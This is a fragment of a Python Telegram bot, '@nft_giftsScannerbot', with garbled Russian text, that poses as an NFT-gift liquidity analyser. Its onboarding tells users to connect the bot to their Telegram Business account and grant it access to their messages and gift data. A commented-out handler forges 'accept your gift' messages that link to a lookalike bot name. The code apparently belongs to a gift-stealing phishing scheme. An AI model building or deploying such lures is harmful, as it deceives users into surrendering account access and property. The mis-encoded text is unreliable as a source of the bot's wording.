            "‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É!\n\n"
            "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞.",
            parse_mode="HTML"
        )
        return
    
    photos = [
        InputMediaPhoto(
            media=FSInputFile("media/1.jpg"), 
            caption="<b>–î–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∞–Ω–∞–ª–∏–∑–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-—á–∞—Ç—É.\n–≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –±–æ—Ç—É –ø–æ–ª—É—á–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–æ–æ–±—â–µ–Ω–∏—è–º –∏ –¥–∞–Ω–Ω—ã–º –æ –ø–æ–¥–∞—Ä–∫–∞—Ö –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–ª–µ–µ —Ç–æ—á–Ω—ã—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤!</b>",
            parse_mode="HTML"
        ),
        InputMediaPhoto(media=FSInputFile("media/2.jpg")),
        InputMediaPhoto(media=FSInputFile("media/3.jpg")),
    ]
    
    await bot.send_media_group(chat_id, media=photos)

    builder = InlineKeyboardBuilder()
    builder.button(text="–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ üîÅ", callback_data="check_auth")
    check_auth = builder.as_markup()

    await bot.send_message(
        chat_id,
        "<b>–î–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è:</b>\n"
        "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram\n"
        "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞\n"
        "3. ü§ñ –ù–∞–π–¥–∏—Ç–µ –ø—É–Ω–∫—Ç –ß–∞—Ç-–±–æ—Ç—ã\n"
        "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ @nft_giftsScannerbot –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è",
        reply_markup=check_auth,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "check_auth")
async def check_auth_handler(callback: types.CallbackQuery):
    chat_id = callback.from_user.id
    connections = load_connections()
    user_connected = any(str(chat_id) == str(conn["user_id"]) for conn in connections)
    
    if user_connected:
        await callback.answer("‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã!", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await bot.send_message(
            chat_id,
            "üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–∏–ª–∏ –±–æ—Ça.\n"
            "–¢–µ–ø–µ—Ä—å –≤–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏.\n/select_chat - –≤—ã–±–æ—Ä —á–∞—Ç–∞\n/select_group - –≤—ã–±–æ—Ä –≥—Ä—É–ø–ø—ã\n/liquid_nft - –∞–Ω–∞–ª–∏–∑ –Ω–∞ –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç—å\n/my_gifts - –º–æ–∏ –ø–æ–¥–∞—Ä–∫–∏",
            parse_mode="HTML"
        )
    else:
        await callback.answer("‚ùå –í—ã –µ—â–µ –Ω–µ –ø–æ–¥–∫–ª—é—á–∏–ª–∏ –±–æ—Ç–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–ª–µ–¥—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤—ã—à–µ!", show_alert=True)



# @dp.inline_query()
# async def inline_gift_handler(inline_query: InlineQuery):
#     query = inline_query.query.lower()
#
#     if "nft" in query or "gift" in query:
#         # –ü–∞—Ä—Å–∏–º URL NFT
#         nft_url = inline_query.query
#         nft_name = nft_url.split('/')[-1]  # –ü–æ–ª—É—á–∞–µ–º —á–∞—Å—Ç—å –ø–æ—Å–ª–µ –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ /
#         name_part, number_part = nft_name.split('-') if '-' in nft_name else (nft_name, '1')
#
#         builder = InlineKeyboardBuilder()
#         builder.button(
#             text="üéÅ –ü—Ä–∏–Ω—è—Ç—å –ø–æ–¥–∞—Ä–æ–∫",
#             url=f"https://t.me/NFTprlce_robot"
#         )
#         builder.button(
#             text="üñº –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫",
#             url=nft_url
#         )
#         builder.adjust(1)
#
#         result = InlineQueryResultArticle(
#             id="1",
#             title=f"–û—Ç–ø—Ä–∞–≤–∏—Ç—å NFT –ø–æ–¥–∞—Ä–æ–∫: {name_part} #{number_part}",
#             description=f"–ù–∞–∂–º–∏—Ç–µ, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å {name_part} #{number_part}",
#             input_message_content=InputTextMessageContent(
#                 message_text=(
#                     f"<b><a href='{nft_url}'>üíå</a> {name_part} #{number_part}</b>\n\n"
#                     f"üéÅ <i>–ö—Ç–æ-—Ç–æ —Ä–µ—à–∏–ª –≤–∞—Å –ø–æ—Ä–∞–¥–æ–≤–∞—Ç—å ‚Äî –ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –Ω–∞–∂–∞–≤ \"–ü—Ä–∏–Ω—è—Ç—å\"</i>"
#                 ),
#                 parse_mode="HTML"
#             ),
#             reply_markup=builder.as_markup(),
#             thumbnail_url=nft_url
#         )
#
#         await inline_query.answer([result], cache_time=1)

async def main():
    print("owner: unknown")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
